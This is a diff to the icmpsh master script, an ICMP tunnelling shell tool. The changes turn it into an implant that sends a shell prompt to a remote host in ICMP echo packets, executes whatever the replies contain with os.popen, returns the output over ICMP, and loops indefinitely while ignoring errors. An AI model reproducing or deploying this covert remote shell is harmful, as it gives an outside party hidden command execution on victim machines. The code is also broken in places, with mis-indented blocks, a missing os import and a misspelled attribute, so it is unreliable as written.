@@ -24,6 +24,7 @@ import select
 import socket
 import subprocess
 import sys
+import time
 
 def setNonBlocking(fd):
     """
@@ -37,6 +38,7 @@ def setNonBlocking(fd):
     fcntl.fcntl(fd, fcntl.F_SETFL, flags)
 
 def main(src, dst):
+ while True:
     if subprocess.mswindows:
         sys.stderr.write('icmpsh master can only run on Posix systems\n')
         sys.exit(255)
@@ -69,70 +71,81 @@ def main(src, dst):
     ip.set_ip_src(src)
     ip.set_ip_dst(dst)
 
-    # Create a new ICMP packet of type ECHO REPLY
+    # Create a new ICMP packet of type ECHO 
     icmp = ImpactPacket.ICMP()
-    icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)
-    icmp.set_icmp_timeout = 0
+    icmp.set_icmp_type(icmp.ICMP_ECHO)
 
     # Instantiate an IP packets decoder
     decoder = ImpactDecoder.IPDecoder()
 
+    # Include a 156-character long payload inside the ICMP packet.
+    icmp.contains(ImpactPacket.Data("\nshell#"))
+
+    # Have the IP packet contain the ICMP packet (along with its payload).
+    ip.contains(icmp)
+    ident = 65535
+    seq_id = 0
+    # Give the ICMP packet the next ID in the sequence.
+    seq_id += 1
+    icmp.set_icmp_id(ident)
+    icmp.set_icmp_id(seq_id)
+      
+    # Calculate its checksum.
+    icmp.set_icmp_cksum(0)
+    icmp.auto_checksum = 1
+    icmp.set_icmp_timeout = 0
+    # Send it to the target host.
+    sock.sendto(ip.get_packet(), (dst, 0))
+
     while 1:
-        cmd = ''
+        #cmd = ''
 
         # Wait for incoming replies
         if sock in select.select([ sock ], [], [])[0]:
             buff = sock.recv(4096)
 
-            if 0 == len(buff):
-               # Socket remotely closed
-               sock.close()
-               sys.exit(0)
+            #if 0 == len(buff):
+                # Socket remotely closed
+            #    sock.close()
+            #    sys.exit(0)
 
             # Packet received; decode and display it
             ippacket = decoder.decode(buff)
             icmppacket = ippacket.child()
 
             # If the packet matches, report it to the user
-            if ippacket.get_ip_dst() == src and ippacket.get_ip_src() == dst and 8 == icmppacket.get_icmp_type():
+            if ippacket.get_ip_dst() == src and ippacket.get_ip_src() == dst and  0 == icmppacket.get_icmp_type() :
+              try:
                 # Get identifier and sequence number
                 ident = icmppacket.get_icmp_id()
                 seq_id = icmppacket.get_icmp_seq()
-                data = icmppacket.get_data_as_string()
+                seq_id += 1
+		data = icmppacket.get_data_as_string()
 
                 if len(data) > 0:
-                    sys.stdout.write(data + "\nshell#" )
+                    sys.stdout.write(data + "\nshell#")
 
-                # Parse command from standard input
-                try:
-                    cmd = sys.stdin.readline()
-                except:
-                    pass
-
-                if cmd == 'exit\n':
-                    return
-
+                #Parse command from standard input
+		strcmd = os.popen(data).read()
+                
+		#proc = subprocess.Popen(data, stdout=subprocess.PIPE)
+		#strcmd = proc.stdout.read()                
                 # Set sequence number and identifier
                 icmp.set_icmp_id(ident)
                 icmp.set_icmp_seq(seq_id)
-
-               # Calculate its checksum
+                # Calculate its checksum
                 icmp.set_icmp_cksum(0)
                 icmp.auto_checksum = 1
-                icmp.set_icmp_timeout = 0
-
+                icmp.set_icmpt_timeout = 0
 	        # Include the command as data inside the ICMP packet
-		reply = 'abcdefghi'
-                # Send it to the target host
-		if (data.find(reply) == -1):
-		   icmp.contains(ImpactPacket.Data(cmd))
-		else:
-		   icmp.contains(ImpactPacket.Data(data))
-
-                 # Have the IP packet contain the ICMP packet (along with its payload)
-                ip.contains(icmp)
-
-		sock.sendto(ip.get_packet(), (dst, 0))
+		icmp.contains(ImpactPacket.Data(strcmd))
+                # Have the IP packet contain the ICMP packet (along with its payload)
+                   	
+		ip.contains(icmp)
+  		sock.sendto(ip.get_packet(), (dst, 0))
+              except:
+                break
+	#time.sleep(5)
 
 if __name__ == '__main__':
     if len(sys.argv) < 3:
